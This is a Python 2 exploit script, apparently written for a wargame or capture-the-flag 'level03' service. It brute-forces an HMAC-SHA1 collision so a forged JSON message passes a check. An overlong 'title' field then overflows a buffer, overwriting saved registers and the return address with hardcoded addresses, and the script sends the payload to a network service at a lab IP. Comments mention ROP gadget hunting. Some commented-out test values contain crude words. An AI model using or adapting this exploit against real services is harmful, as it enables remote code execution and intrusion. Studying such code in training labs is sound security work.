#!/usr/bin/python
import struct
import sys
import core
import time
import hmac
import hashlib
import json

'''
shell pgrep level03
shell cat /proc/pid/maps
ropgadget: usage: python ./ropgadget.py --binary level03 | grep pop
'''

def generate_collision(token, tags_dict, replace1, replace2):
    loop_cnt = 0
    while True:
        json_str = json.dumps(tags_dict)
        json_str = json_str.replace('NNNN', replace1) # overwrite ebx with gContents
        json_str = json_str.replace('EEEE', replace2) # eip to ???
        #0x08049387
        #0x08049387
        padded_msg = token
        padded_msg += "\n"
        padded_msg = str(padded_msg)
        padded_msg += json_str

        hmac_digest = hmac.new(token, padded_msg, hashlib.sha1).digest()
        result_or = ord(hmac_digest[0]) | ord(hmac_digest[1])
        if result_or == 0:
            break
        loop_cnt+=1
        tags_dict['pad'] = loop_cnt
    return padded_msg

def main(fd):
    token = core.rx_until(fd, "\n")
    #token = token.replace("\"", "")[:-1]  #strip newline
    token = json.loads(token)
    print "Token: {0}".format(token)
    EBX = 'NNNN'
    EBP = 'DDDD'
    ESI = 'BBBB'
    EDI = 'CCCC'
    EIP = 'EEEE'
    BUF = 'AAAABBBBCCCCDDD'+ EBX + ESI + EDI + EBP + EIP
    BUF += 'MMMM'
    #BUF += 'A' * 500

    #tags_dict = {'serverip':'192.168.136.100:6969', 'tags':['fuckyou']*128, 'contents':'penis', 'title':'fastcars', 'pad':0}
    #tags_dict = {'serverip':'192.168.136.100:6969', 'tags':['AAAA', 'BBBB'], 'contents':'penis', 'title':'A\uAAAA'*64, 'pad':0}
    tags_dict = {'serverip':'192.168.136.100:6969', 'tags':['AAAA', 'BBBB'], 'contents':'\uCCCC', 'title':'A'*127+'\uAAAA' + BUF, 'pad':0}
    # JMP ESP FF e4
    #define __NR_mprotect           125

    start_t = time.time()                                        # gContents                       read@plt             srand plt           ???
    msg = generate_collision(token, tags_dict, struct.pack('<I', 0x0804bdf4), struct.pack('<I', 0x804bd38))#0x8048c20))#0x08049387))#0x0804a933))
    print "Elapsed Time: {0}s".format(time.time()-start_t)
    fd.send(msg)
    
    print "Msg: {0}".format(msg)
    print "Note that sockets have been disconnected!"


if __name__ == "__main__":
    if len(sys.argv) > 2:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print "Assigning default IP/PORT"
        ip = "192.168.44.137"
        port = 20003
    fd = core.attach(ip, port, wait=True)
    main(fd)
